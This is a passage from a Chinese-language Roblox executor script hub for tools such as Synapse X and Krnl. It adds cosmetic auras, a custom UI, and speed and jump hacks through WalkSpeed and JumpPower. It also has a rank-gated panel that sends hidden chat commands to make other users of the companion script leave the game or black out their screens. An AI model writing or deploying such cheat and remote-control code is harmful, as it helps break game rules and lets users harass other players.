    sound.Parent = LocalPlayer.Character or workspace.CurrentCamera
    sound:Play()

    local tween = TweenService:Create(bg, TweenInfo.new(7, Enum.EasingStyle.Linear), {Position = UDim2.new(0, -textWidth, bg.Position.Y.Scale, 0)})
    tween:Play()
    tween.Completed:Connect(function() gui:Destroy() end)
end

local autoDanmakuEnabled = false
local autoDanmakuPool = { "款脚本太厉害了", "好玩", "值得推荐", "666" }
local danmakuCount = 0
local hasSentLoveDanmaku = false

local function StartAutoDanmaku()
    if not autoDanmakuEnabled then return end
    task.spawn(function()
        while autoDanmakuEnabled do
            danmakuCount = danmakuCount + 1
            if danmakuCount == 11 and not hasSentLoveDanmaku then
                CreateDanmaku("你是我的！")
                hasSentLoveDanmaku = true
            else
                local text = autoDanmakuPool[math.random(1, #autoDanmakuPool)]
                CreateDanmaku(text)
            end
            task.wait(math.random(20, 30) / 10)
        end
    end)
end

local ActiveAuraStates = {}

local function ApplyAllAuras()
    local char = LocalPlayer.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            local oldFire = part:FindFirstChild("Aura_Fire")
            if oldFire then oldFire:Destroy() end
        end
    end
    for _, name in ipairs({"Fire", "Lightning", "Rainbow", "Smoke"}) do
        local existing = hrp:FindFirstChild("Aura_" .. name)
        if existing then existing:Destroy() end
        local existingSpark = hrp:FindFirstChild("Aura_" .. name .. "Spark")
        if existingSpark then existingSpark:Destroy() end
    end

    for name, isEnabled in pairs(ActiveAuraStates) do
        if isEnabled then
            if name == "Fire" then
                local bodyParts = {
                    "HumanoidRootPart", "Head", "Torso", "UpperTorso", "LowerTorso",
                    "Left Arm", "Right Arm", "LeftUpperArm", "RightUpperArm",
                    "LeftLowerArm", "RightLowerArm", "LeftHand", "RightHand",
                    "Left Leg", "Right Leg", "LeftUpperLeg", "RightUpperLeg",
                    "LeftLowerLeg", "RightLowerLeg", "LeftFoot", "RightFoot"
                }
                for _, partName in ipairs(bodyParts) do
                    local part = char:FindFirstChild(partName)
                    if part and part:IsA("BasePart") then
                        local fire = Instance.new("Fire")
                        fire.Name = "Aura_Fire"
                        fire.Size = math.random(4, 7)
                        fire.Heat = math.random(3, 6)
                        fire.Color = Color3.fromRGB(255, 170, 60)
                        fire.SecondaryColor = Color3.fromRGB(220, 40, 0)
                        fire.Parent = part
                    end
                end
            elseif name == "Lightning" then
                local emitter = Instance.new("ParticleEmitter")
                emitter.Name = "Aura_Lightning"
                emitter.Texture = "rbxassetid://243660364"
                emitter.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0.0, Color3.fromRGB(255, 230, 130)),
                    ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 130, 0)),
                    ColorSequenceKeypoint.new(1.0, Color3.fromRGB(200, 20, 0)),
                })
                emitter.Size = NumberSequence.new({
                    NumberSequenceKeypoint.new(0.0, 2.5),
                    NumberSequenceKeypoint.new(0.4, 7),
                    NumberSequenceKeypoint.new(1.0, 0.2),
                })
                emitter.Transparency = NumberSequence.new({
                    NumberSequenceKeypoint.new(0.0, 0.9),
                    NumberSequenceKeypoint.new(0.15, 0.1),
                    NumberSequenceKeypoint.new(0.75, 0.55),
                    NumberSequenceKeypoint.new(1.0, 1),
                })
                emitter.Rate = 180
                emitter.Speed = NumberRange.new(4, 9)
                emitter.Lifetime = NumberRange.new(1.2, 2.2)
                emitter.SpreadAngle = Vector2.new(0, 360)
                emitter.Rotation = NumberRange.new(0, 360)
                emitter.RotSpeed = NumberRange.new(-40, 40)
                emitter.LightEmission = 1
                emitter.LightInfluence = 0
                emitter.Parent = hrp

                local spark = Instance.new("ParticleEmitter")
                spark.Name = "Aura_LightningSpark"
                spark.Texture = "rbxassetid://243098098"
                spark.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0.0, Color3.fromRGB(255, 220, 120)),
                    ColorSequenceKeypoint.new(1.0, Color3.fromRGB(255, 80, 0)),
                })
                spark.Size = NumberSequence.new({
                    NumberSequenceKeypoint.new(0.0, 0.8),
                    NumberSequenceKeypoint.new(1.0, 0.05),
                })
                spark.Transparency = NumberSequence.new({
                    NumberSequenceKeypoint.new(0.0, 0.2),
                    NumberSequenceKeypoint.new(1.0, 1),
                })
                spark.Rate = 120
                spark.Speed = NumberRange.new(6, 14)
                spark.Lifetime = NumberRange.new(0.6, 1.2)
                spark.SpreadAngle = Vector2.new(0, 360)
                spark.LightEmission = 1
                spark.LightInfluence = 0
                spark.Parent = hrp
            elseif name == "Rainbow" then
                local emitter = Instance.new("ParticleEmitter")
                emitter.Name = "Aura_Rainbow"
                emitter.Texture = "rbxassetid://243098098"
                emitter.Color = ColorSequence.new(Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0))
                emitter.Size = NumberSequence.new(1.5)
                emitter.Rate = 40
                emitter.Speed = NumberRange.new(3)
                emitter.Lifetime = NumberRange.new(1)
                emitter.Parent = hrp
            elseif name == "Smoke" then
                local emitter = Instance.new("ParticleEmitter")
                emitter.Name = "Aura_Smoke"
                emitter.Texture = "rbxassetid://243098098"
                emitter.Color = ColorSequence.new(Color3.fromRGB(50, 50, 50))
                emitter.Size = NumberSequence.new(3)
                emitter.Rate = 20
                emitter.Speed = NumberRange.new(1)
                emitter.Lifetime = NumberRange.new(2)
                emitter.Parent = hrp
            end
        end
    end
end

LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    ApplyAllAuras()
end)

local beautyToggles = {
    Head = false, LeftArm = false, RightArm = false,
    LeftLeg = false, RightLeg = false, Torso = false, BreakLegs = false
}

local function ApplyBeauty()
    local char = LocalPlayer.Character
    if not char then return end
    local function setPartTransparency(partName, transparency)
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                if part.Name == partName or part.Name:find(partName) then
                    part.LocalTransparencyModifier = transparency and 1 or 0
                end
            end
        end
    end
    setPartTransparency("Head", beautyToggles.Head)
    if beautyToggles.Torso then for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") and (p.Name == "Torso" or p.Name == "UpperTorso" or p.Name == "LowerTorso") then p.LocalTransparencyModifier = 1 end end else for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") and (p.Name == "Torso" or p.Name == "UpperTorso" or p.Name == "LowerTorso") then p.LocalTransparencyModifier = 0 end end end
    if beautyToggles.LeftArm then for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") and (p.Name == "Left Arm" or p.Name:find("LeftUpperArm") or p.Name:find("LeftLowerArm") or p.Name:find("LeftHand")) then p.LocalTransparencyModifier = 1 end end else for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") and (p.Name == "Left Arm" or p.Name:find("LeftUpperArm") or p.Name:find("LeftLowerArm") or p.Name:find("LeftHand")) then p.LocalTransparencyModifier = 0 end end end
    if beautyToggles.RightArm then for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") and (p.Name == "Right Arm" or p.Name:find("RightUpperArm") or p.Name:find("RightLowerArm") or p.Name:find("RightHand")) then p.LocalTransparencyModifier = 1 end end else for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") and (p.Name == "Right Arm" or p.Name:find("RightUpperArm") or p.Name:find("RightLowerArm") or p.Name:find("RightHand")) then p.LocalTransparencyModifier = 0 end end end
    if beautyToggles.LeftLeg then for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") and (p.Name == "Left Leg" or p.Name:find("LeftUpperLeg") or p.Name:find("LeftLowerLeg") or p.Name:find("LeftFoot")) then p.LocalTransparencyModifier = 1 end end else for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") and (p.Name == "Left Leg" or p.Name:find("LeftUpperLeg") or p.Name:find("LeftLowerLeg") or p.Name:find("LeftFoot")) then p.LocalTransparencyModifier = 0 end end end
    if beautyToggles.RightLeg then for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") and (p.Name == "Right Leg" or p.Name:find("RightUpperLeg") or p.Name:find("RightLowerLeg") or p.Name:find("RightFoot")) then p.LocalTransparencyModifier = 1 end end else for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") and (p.Name == "Right Leg" or p.Name:find("RightUpperLeg") or p.Name:find("RightLowerLeg") or p.Name:find("RightFoot")) then p.LocalTransparencyModifier = 0 end end end
    if beautyToggles.BreakLegs then for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") and (p.Name == "Left Leg" or p.Name == "Right Leg" or p.Name:find("UpperLeg") or p.Name:find("LowerLeg") or p.Name:find("Foot")) then p.LocalTransparencyModifier = 1 end end end
end

LocalPlayer.CharacterAdded:Connect(function()
    task.wait(0.5)
    ApplyBeauty()
end)

local function PlayExclusiveIntro(onComplete)
    local pg = LocalPlayer:WaitForChild("PlayerGui")
    local old = pg:FindFirstChild("ExclusiveIntroGui")
    if old then old:Destroy() end
    local gui = Instance.new("ScreenGui")
    gui.Name = "ExclusiveIntroGui"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 20000
    gui.IgnoreGuiInset = true
    gui.Parent = pg
    local bg = Instance.new("Frame", gui)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(5, 5, 8)
    bg.BorderSizePixel = 0
    bg.BackgroundTransparency = 1
    TweenService:Create(bg, TweenInfo.new(0.5), { BackgroundTransparency = 0 }):Play()
    local centerFrame = Instance.new("Frame", gui)
    centerFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    centerFrame.Position = UDim2.new(0.5, 0, 0.5, -20)
    centerFrame.Size = UDim2.new(0, 120, 0, 120)
    centerFrame.BackgroundTransparency = 1
    centerFrame.Rotation = 0
    local ring1 = Instance.new("Frame", centerFrame)
    ring1.Size = UDim2.new(1, 0, 1, 0)
    ring1.BackgroundTransparency = 1
    ring1.BorderSizePixel = 0
    local ring1Corner = Instance.new("UICorner", ring1)
    ring1Corner.CornerRadius = UDim.new(1, 0)
    local ring1Stroke = Instance.new("UIStroke", ring1)
    ring1Stroke.Thickness = 3
    ring1Stroke.Color = Color3.fromRGB(0, 200, 255)
    ring1Stroke.Transparency = 0.2
    local ring1Gradient = Instance.new("UIGradient", ring1Stroke)
    ring1Gradient.Rotation = 0
    ring1Gradient.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0.0, 0), NumberSequenceKeypoint.new(0.5, 0),
        NumberSequenceKeypoint.new(0.5001, 1), NumberSequenceKeypoint.new(1.0, 1)
    })
    ring1Gradient.Color = ColorSequence.new(Color3.fromRGB(0, 200, 255))
    local ring2 = Instance.new("Frame", centerFrame)
    ring2.Size = UDim2.new(0.7, 0, 0.7, 0)
    ring2.AnchorPoint = Vector2.new(0.5, 0.5)
    ring2.Position = UDim2.new(0.5, 0, 0.5, 0)
    ring2.BackgroundTransparency = 1
    ring2.BorderSizePixel = 0
    local ring2Corner = Instance.new("UICorner", ring2)
    ring2Corner.CornerRadius = UDim.new(1, 0)
    local ring2Stroke = Instance.new("UIStroke", ring2)
    ring2Stroke.Thickness = 2
    ring2Stroke.Color = Color3.fromRGB(0, 200, 255)
    ring2Stroke.Transparency = 0.4
    local ring2Gradient = Instance.new("UIGradient", ring2Stroke)
    ring2Gradient.Rotation = 180
    ring2Gradient.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0.0, 0), NumberSequenceKeypoint.new(0.5, 0),
        NumberSequenceKeypoint.new(0.5001, 1), NumberSequenceKeypoint.new(1.0, 1)
    })
    ring2Gradient.Color = ColorSequence.new(Color3.fromRGB(0, 200, 255))
    local core = Instance.new("Frame", centerFrame)
    core.AnchorPoint = Vector2.new(0.5, 0.5)
    core.Position = UDim2.new(0.5, 0, 0.5, 0)
    core.Size = UDim2.new(0, 0, 0, 0)
    core.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
    core.BorderSizePixel = 0
    local coreCorner = Instance.new("UICorner", core)
    coreCorner.CornerRadius = UDim.new(1, 0)
    local coreGlow = Instance.new("ImageLabel", core)
    coreGlow.Size = UDim2.new(3, 0, 3, 0)
    coreGlow.Position = UDim2.new(0.5, 0, 0.5, 0)
    coreGlow.AnchorPoint = Vector2.new(0.5, 0.5)
    coreGlow.BackgroundTransparency = 1
    coreGlow.Image = "rbxassetid://5028857472"
    coreGlow.ImageColor3 = Color3.fromRGB(0, 200, 255)
    coreGlow.ImageTransparency = 0.3
    local title = Instance.new("TextLabel", gui)
    title.AnchorPoint = Vector2.new(0.5, 0.5)
    title.Position = UDim2.new(0.5, 0, 0.5, 110)
    title.Size = UDim2.new(0, 300, 0, 30)
    title.BackgroundTransparency = 1
    title.Text = "KUAN SYSTEM"
    title.TextColor3 = Color3.fromRGB(200, 200, 210)
    title.TextSize = 20
    title.Font = Enum.Font.GothamBold
    title.TextTransparency = 1
    local barBg = Instance.new("Frame", gui)
    barBg.AnchorPoint = Vector2.new(0.5, 0.5)
    barBg.Position = UDim2.new(0.5, 0, 0.5, 145)
    barBg.Size = UDim2.new(0, 150, 0, 1)
    barBg.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
    barBg.BorderSizePixel = 0
    barBg.BackgroundTransparency = 1
    local barFill = Instance.new("Frame", barBg)
    barFill.Size = UDim2.new(0, 0, 1, 0)
    barFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
    barFill.BorderSizePixel = 0
    task.wait(0.5)
    TweenService:Create(core, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Size = UDim2.new(0, 8, 0, 8) }):Play()
    TweenService:Create(title, TweenInfo.new(0.5), { TextTransparency = 0, Position = UDim2.new(0.5, 0, 0.5, 100) }):Play()
    TweenService:Create(barBg, TweenInfo.new(0.5), { BackgroundTransparency = 0 }):Play()
    local rotationConn
    local rotSpeed1, rotSpeed2 = 1, -2
    rotationConn = RunService.RenderStepped:Connect(function(dt)
        ring1.Rotation = (ring1.Rotation + rotSpeed1 * dt * 60) % 360
        ring2.Rotation = (ring2.Rotation + rotSpeed2 * dt * 60) % 360
    end)
    local progressTween = TweenService:Create(barFill, TweenInfo.new(2, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), {
        Size = UDim2.new(1, 0, 1, 0)
    })
    progressTween:Play()
    task.wait(1.5)
    TweenService:Create(coreGlow, TweenInfo.new(0.3), { ImageTransparency = 0 }):Play()
    TweenService:Create(ring1Stroke, TweenInfo.new(0.3), { Thickness = 5 }):Play()
    TweenService:Create(ring2Stroke, TweenInfo.new(0.3), { Thickness = 4 }):Play()
    task.wait(0.3)
    if rotationConn then rotationConn:Disconnect() end
    TweenService:Create(bg, TweenInfo.new(0.5), { BackgroundTransparency = 1 }):Play()
    TweenService:Create(gui, TweenInfo.new(0.5), { Enabled = false }):Play()
    task.wait(0.5)
    gui:Destroy()
    if onComplete then onComplete() end
end
local function StartMain()
    local function Soundify(tabObj)
        local oldSection = tabObj.Section
        if oldSection then
            tabObj.Section = function(self, cfg)
                local sec = oldSection(self, cfg)
                local oldToggle = sec.Toggle
                local oldButton = sec.Button
                if oldToggle then
                    sec.Toggle = function(_self, _cfg)
                        local cb = _cfg.Callback
                        _cfg.Callback = function(v) PlayStartSound(); if cb then cb(v) end end
                        return oldToggle(_self, _cfg)
                    end
                end
                if oldButton then
                    sec.Button = function(_self, _cfg)
                        local cb = _cfg.Callback
                        _cfg.Callback = function() PlayStartSound(); if cb then cb() end end
                        return oldButton(_self, _cfg)
                    end
                end
                return sec
            end
        end
        return tabObj
    end

    Window = library:CreateWindow({
        Name = "款脚本",
        SubName = "欢迎使用此脚本",
        Keybind = Enum.KeyCode.RightShift,
        Logo = 83701039519151,
        Scene = 0,
        Theme = "Dark"
    })
    Window.CurrentConfig = "None"
    Window:TabDivider()

    Window:CreateHomeTab({
        Name = "信息",
        Logo = "83701039519151",
        DiscordInvite = "",
        SupportedExecutors = { "Delta", "Synapse X", "Krnl", "Codex", "Arceus X" },
        UnsupportedExecutors = { "Roblox Studio" },
        Segments = {
            Details = { Text = "取消", Icon = "no" },
            Script = { Text = "更新日志", Icon = "no" },
        },
        Changelog = {
            { Title = "14.0版本", Description = "更新了UI、推出了UI特效、添加普通成员关闭头街" },
        },
    })

    local FengYu = Soundify(Window:Tab("内部人员", "83701039519151"))
    local Feng = FengYu:Section({ Name = "开发人员", SubName = "款脚本团队", Logo = "83701039519151", Collapsible = true, Collapsed = true })
    Feng:Video({ Video = "rbxassetid://5608337069", Name = "视频哦", AutoPlay = true, Looped = true, Volume = 0.5, AspectRatio = "16:9", Radius = 8 })
    Feng:Social({ Name = "款脚本创始人", SubName = "若白", SmlName = "QQ", copy = "2838596061", Cbn = "复制", Logo = "rbxassetid://133726756673211" })
    Feng:Social({ Name = "测试人员", SubName = " Pizza", SmlName = " QQ", copy = "3911763723", Cbn = "复制", Logo = "rbxassetid://74321980638899" })
    Feng:Social({ Name = "测试人员", SubName = "菜鸟", SmlName = "快手号", copy = "4358864292", Cbn = "复制", Logo = "rbxassetid://101841794686409" })
    Feng:Social({ Name = "测试人员", SubName = "noob", SmlName = " QQ", copy = "1289069071", Cbn = "复制", Logo = "rbxassetid://97440914928707" })
    Feng:Social({ Name = "测试人员", SubName = "耄耋", SmlName = " 快手号", copy = "1420771195", Cbn = "复制", Logo = "rbxassetid://80607128221856" })
    Feng:Social({ Name = "测试官", SubName = "noob45", SmlName = " QQ", copy = "3295626426", Cbn = "复制", Logo = "rbxassetid://118907524255142" })
    Feng:Social({ Name = "测试官", SubName = "纾苇", SmlName = " QQ", copy = "3528796314", Cbn = "复制", Logo = "rbxassetid://77935840039458" })
    Feng:Social({ Name = "款脚本群", SubName = "款脚本", SmlName = "QQ群", copy = "1056676792", Cbn = "复制", Logo = "rbxassetid://83701039519151" })
    Feng:Social({ Name = "殺脚本作者(思师)", SubName = "风御 X", SmlName = "QQ", copy = "1926190957", Cbn = "复制", Logo = "rbxassetid://70554553650974" })
    Feng:Social({ Name = "殺脚本群", SubName = "殺脚本", SmlName = "QQ群", copy = "958022428", Cbn = "复制", Logo = "rbxassetid://84830962019412" })

    Window:TabDivider()

 local tabPerm = Soundify(Window:Tab(selfRole .. "权限", "83701039519151"))
local sectionTag = tabPerm:Section({ Name = selfRole .. "头衔", SubName = "头衔开关与效果", Logo = "83701039519151", Collapsible = true, Collapsed = true })
sectionTag:Toggle({ Name = "显示头顶头衔", Value = true, Callback = function(v)
    showHeadTagEnabled = v
    if v then
        refreshAllTags()
    else
        for p in pairs(activeTags) do clearTag(p) end
    end
end })
if getRank(LocalPlayer.Name) >= 2 then
    sectionTag:Toggle({ Name = "头衔背景图片", Value = false, Callback = function(v)
        tagBackgroundEnabled = v
        for _, billboard in pairs(activeTags) do
            local image = billboard:FindFirstChild("TagBackgroundImage", true)
            if image then image.Visible = v end
        end
    end })
end
if getRank(LocalPlayer.Name) == 3 then
    sectionTag:Toggle({ Name = "流光效果", Value = true, Callback = function(v)
        tagShimmerEnabled = v
    end })
end
sectionTag:Toggle({ Name = "上下震动", Value = false, Callback = function(v)
    tagVerticalShakeEnabled = v
end })
sectionTag:Toggle({ Name = "左右震动", Value = false, Callback = function(v)
    tagHorizontalShakeEnabled = v
end })

-- 区域管理仅向测试人员、测试官和作者开放
if getRank(LocalPlayer.Name) >= 1 then
    local sectionRegion = tabPerm:Section({
        Name = "区域管理",
        SubName = "位置查看与低等级玩家管理",
        Logo = "83701039519151",
        Collapsible = true,
        Collapsed = true
    })

    sectionRegion:Button({
        Name = "定位自己的位置",
        Callback = function()
            local character = LocalPlayer.Character
            local root = character and character:FindFirstChild("HumanoidRootPart")
            if not root then
                pcall(function()
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                        Title = "区域管理", Text = "暂时无法获取位置，请确认角色已加载。", Duration = 4
                    })
                end)
                return
            end
            local pos = root.Position
            local positionText = string.format("X: %.2f  Y: %.2f  Z: %.2f", pos.X, pos.Y, pos.Z)
            pcall(function()
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "你当前的位置", Text = positionText, Duration = 8
                })
            end)
            print("[款脚本] 你当前的位置: " .. positionText)
        end
    })

    -- 测试人员专属：仅影响本地看到的头衔特效，不会远程修改其他玩家客户端。
    sectionRegion:Toggle({
        Name = "本地限制低等级头衔特效",
        Value = false,
        Callback = function(v)
            restrictLowRankTagEffects = v
            refreshAllTags()
        end
    })
end

-- 测试官和作者的聊天“开/关”权限独立于测试人员区域管理。
-- “开”会显示本地客户端可识别的其他脚本用户头衔；“关”则隐藏。
if getRank(LocalPlayer.Name) >= 2 then
    local sectionOfficer = tabPerm:Section({
        Name = "测试官与作者权限",
        SubName = "头衔显示管理",
        Logo = "83701039519151",
        Collapsible = true,
        Collapsed = true
    })
    sectionOfficer:Button({
        Name = "刷新玩家头衔显示",
        Callback = function()
            showOtherTagsEnabled = true
            allowLowRankTagsEnabled = true
            refreshAllTags()
        end
    })
    sectionOfficer:Button({
        Name = "关闭其他玩家头衔显示",
        Callback = function()
            showOtherTagsEnabled = false
            allowLowRankTagsEnabled = false
            refreshAllTags()
        end
    })

    -- 请求目标离开：目标也必须运行配套款脚本，接收端才会自动同意并退出。
    local leaveRequestTarget = ""
    local sectionLeaveRequest = tabPerm:Section({
        Name = "请求玩家离开",
        SubName = "对方运行配套脚本时自动同意",
        Logo = "83701039519151",
        Collapsible = true,
        Collapsed = true
    })
    sectionLeaveRequest:Textbox({
        Name = "输入目标 Roblox 用户名",
        Placeholder = "请输入准确用户名",
        Callback = function(v) leaveRequestTarget = tostring(v or ""):gsub("^%s+", ""):gsub("%s+$", "") end
    })
    sectionLeaveRequest:Button({
        Name = "发送离开请求",
        Callback = function()
            if leaveRequestTarget == "" then
                pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = "请求玩家离开", Text = "请先输入用户名。", Duration = 4}) end)
                return
            end
            local target = Players:FindFirstChild(leaveRequestTarget)
            if not target then
                pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = "请求玩家离开", Text = "当前服务器找不到该玩家。", Duration = 4}) end)
                return
            end
            if target == LocalPlayer or getRank(target.Name) >= getRank(LocalPlayer.Name) then
                pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = "请求玩家离开", Text = "只能请求等级低于自己的玩家。", Duration = 4}) end)
                return
            end
            local channels = TextChatService:FindFirstChild("TextChannels")
            local channel = channels and (channels:FindFirstChild("RBXGeneral") or channels:FindFirstChildWhichIsA("TextChannel"))
            if not channel then
                pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = "请求玩家离开", Text = "聊天频道不可用，无法发送请求。", Duration = 4}) end)
                return
            end
            local payload = LEAVE_REQUEST_PREFIX .. tostring(target.UserId) .. ":" .. tostring(LocalPlayer.UserId)
            local ok = pcall(function() channel:SendAsync(payload) end)
            pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = "请求玩家离开", Text = ok and ("已向 " .. target.Name .. " 发送请求；对方需运行配套脚本。") or "发送失败，请检查聊天权限。", Duration = 5}) end)
        end
    })

    -- 黑屏与恢复：通过聊天向目标发送指令，目标需运行配套脚本。
    local blackoutTargetName = ""
    local sectionBlackout = tabPerm:Section({
        Name = "玩家屏幕管理",
        SubName = "向低等级配套脚本用户发送黑屏/恢复指令",
        Logo = "83701039519151",
        Collapsible = true,
        Collapsed = true
    })
    sectionBlackout:Textbox({
        Name = "输入目标 Roblox 用户名",
        Placeholder = "请输入准确用户名",
        Callback = function(v) blackoutTargetName = tostring(v or ""):gsub("^%s+", ""):gsub("%s+$", "") end
    })
    local function sendScreenCommand(prefix, title, actionText)
        if blackoutTargetName == "" then
            pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = title, Text = "请先输入用户名。", Duration = 4}) end)
            return
        end
        local target = Players:FindFirstChild(blackoutTargetName)
        if not target then
            pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = title, Text = "当前服务器找不到该玩家。", Duration = 4}) end)
            return
        end
        if target == LocalPlayer or getRank(target.Name) >= getRank(LocalPlayer.Name) then
            pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = title, Text = "只能操作等级低于自己的玩家。", Duration = 4}) end)
            return
        end
        local channels = TextChatService:FindFirstChild("TextChannels")
        local channel = channels and (channels:FindFirstChild("RBXGeneral") or channels:FindFirstChildWhichIsA("TextChannel"))
        if not channel then
            pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = title, Text = "聊天频道不可用，无法发送指令。", Duration = 4}) end)
            return
        end
        local payload = prefix .. tostring(target.UserId) .. ":" .. tostring(LocalPlayer.UserId)
        local ok = pcall(function() channel:SendAsync(payload) end)
        pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = title, Text = ok and (actionText .. target.Name .. "；对方需运行配套脚本。") or "发送失败，请检查聊天权限。", Duration = 5}) end)
    end
    sectionBlackout:Button({Name = "请求对方黑屏", Callback = function() sendScreenCommand(BLACKOUT_REQUEST_PREFIX, "请求黑屏", "已向 ") end})
    sectionBlackout:Button({Name = "请求对方恢复屏幕", Callback = function() sendScreenCommand(RESTORE_REQUEST_PREFIX, "恢复屏幕", "已向 ") end})

    -- 黑名单管理：本地保存并在本机启动脚本时检查；不具备跨客户端同步能力。
    local blacklistInputName = ""
    local sectionBlacklist = tabPerm:Section({
        Name = "款脚本黑名单",
        SubName = "添加或移除本地黑名单记录",
        Logo = "83701039519151",
        Collapsible = true,
        Collapsed = true
    })
    sectionBlacklist:Textbox({
        Name = "输入玩家 Roblox 用户名",
        Placeholder = "请输入准确用户名",
        Callback = function(v) blacklistInputName = tostring(v or ""):gsub("^%s+", ""):gsub("%s+$", "") end
    })
    local function notifyBlacklist(message)
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "款脚本黑名单", Text = message, Duration = 4
            })
        end)
        print("[款脚本黑名单] " .. message)
    end
    sectionBlacklist:Button({
        Name = "添加到黑名单",
        Callback = function()
            if blacklistInputName == "" then notifyBlacklist("请先输入用户名。"); return end
            if isScriptBlacklisted(blacklistInputName) then notifyBlacklist(blacklistInputName .. " 已在本地黑名单中。"); return end
            table.insert(SCRIPT_BLACKLIST, blacklistInputName)
            local saved = saveScriptBlacklist()
            notifyBlacklist("已记录 " .. blacklistInputName .. (saved and "（已尝试保存到本机）" or "（当前执行器不支持文件保存，仅本次运行有效）"))
        end
    })
    sectionBlacklist:Button({
        Name = "从黑名单移除",
        Callback = function()
            if blacklistInputName == "" then notifyBlacklist("请先输入用户名。"); return end
            local wanted = string.lower(blacklistInputName)
            local removed = false
            for i = #SCRIPT_BLACKLIST, 1, -1 do
                if string.lower(SCRIPT_BLACKLIST[i]) == wanted then
                    table.remove(SCRIPT_BLACKLIST, i)
                    removed = true
                end
            end
            if removed then
                saveScriptBlacklist()
                notifyBlacklist("已从本地黑名单移除 " .. blacklistInputName .. "。")
            else
                notifyBlacklist("名单中没有这个用户名。")
            end
        end
    })
    sectionBlacklist:Button({
        Name = "查看本地黑名单",
        Callback = function()
            if #SCRIPT_BLACKLIST == 0 then notifyBlacklist("当前本地黑名单为空。")
            else notifyBlacklist("本地名单：" .. table.concat(SCRIPT_BLACKLIST, ", ")) end
        end
    })
end

    local tabCommon = Soundify(Window:Tab("通用", "83701039519151"))

local sectionSelf = tabCommon:Section({ Name = "自身修改", SubName = "本地玩家修改", Logo = "83701039519151", Collapsible = true, Collapsed = true })
local speedEnabled, jumpEnabled = false, false
local speedValue, jumpValue = 16, 50
local featureHeartbeat = nil
-- 保存每个角色的原始值，关闭时恢复
local origSpeed, origJumpPower, origJumpHeight, origUseJumpPower = nil, nil, nil, nil
local origChar = nil

local function readOriginals(hum)
    if origChar == hum.Parent then return end
    origChar = hum.Parent
    origSpeed = hum.WalkSpeed
    origUseJumpPower = hum.UseJumpPower
    origJumpPower = hum.JumpPower
    origJumpHeight = hum.JumpHeight
end

local function stopFeatureHeartbeat()
    if featureHeartbeat then
        featureHeartbeat:Disconnect()
        featureHeartbeat = nil
    end
    -- 关闭时恢复原始值（若角色还在）
    local char = LocalPlayer.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum and origChar == char then
            if origSpeed then hum.WalkSpeed = origSpeed end
            if origUseJumpPower ~= nil then
                hum.UseJumpPower = origUseJumpPower
                if origUseJumpPower then
                    if origJumpPower then hum.JumpPower = origJumpPower end
                else
                    if origJumpHeight then hum.JumpHeight = origJumpHeight end
                end
            end
        end
    end
    origChar = nil
    origSpeed, origJumpPower, origJumpHeight, origUseJumpPower = nil, nil, nil, nil
end

local function startFeatureHeartbeat()
    if featureHeartbeat then return end
    featureHeartbeat = RunService.Heartbeat:Connect(function()
        local char = LocalPlayer.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        readOriginals(hum)
        if speedEnabled then hum.WalkSpeed = speedValue end
        if jumpEnabled then
            -- 关键：沿用服务器原本的跳跃模式，不强行改 UseJumpPower
            if hum.UseJumpPower then
                hum.JumpPower = jumpValue
            else
                hum.JumpHeight = jumpValue
            end
        end
    end)
end

local function updateFeatureHeartbeat()
    if speedEnabled or jumpEnabled then
        startFeatureHeartbeat()
    else
        stopFeatureHeartbeat()
    end
end

sectionSelf:Toggle({ Name = "改速度", Value = false, Callback = function(v) speedEnabled = v; updateFeatureHeartbeat() end })
sectionSelf:Slider({ Name = "速度数值", Value = { Min = 0, Max = 500, Default = 16 }, Callback = function(v) speedValue = v end })
sectionSelf:Toggle({ Name = "改跳跃", Value = false, Callback = function(v) jumpEnabled = v; updateFeatureHeartbeat() end })
sectionSelf:Slider({ Name = "跳跃高度", Value = { Min = 0, Max = 500, Default = 50 }, Callback = function(v) jumpValue = v end })

